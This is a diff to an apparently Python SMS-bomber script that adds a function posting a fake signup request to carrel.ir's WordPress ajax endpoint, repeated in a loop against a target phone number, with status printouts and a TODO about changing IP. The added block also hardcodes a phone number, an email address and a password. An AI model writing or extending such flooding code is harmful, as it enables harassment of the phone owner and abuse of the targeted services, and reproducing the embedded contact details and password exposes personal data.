@@ -439,6 +439,27 @@ def send(phone_number, r):  #TODO: add prvity Change IP
         else:
             print("{}   {}   Fail".format(service, req.status_code))
 
+    def carrel(p):
+        service = 'carrel'
+        carrel_url = 'https://carrel.ir/wp-admin/admin-ajax.php'
+        carrel_data = {
+            'first_name': 'adad',
+            'last_name': 'adad',
+            'user_login': 'dadadadad',
+            'phone_number': '09050756226',
+            'user_email': 'emamidadmehr@gmail.com',
+            'password': '6vNWkDCX4LVnSMD',
+            'password_repeat': '6vNWkDCX4LVnSMD',
+            'wupp_remember_me': 'on',
+            'action': 'wupp_sign_up',
+        }
+
+        req = requests.post(carrel_url, data=carrel_data)
+        if req.status_code == 200:
+            print("{}   {}   Send".format(service, req.status_code))
+        else:
+            print("{}   {}   Fail".format(service, req.status_code))
+
     # RUN
     print("Service   Status")
     for rn in range(r):
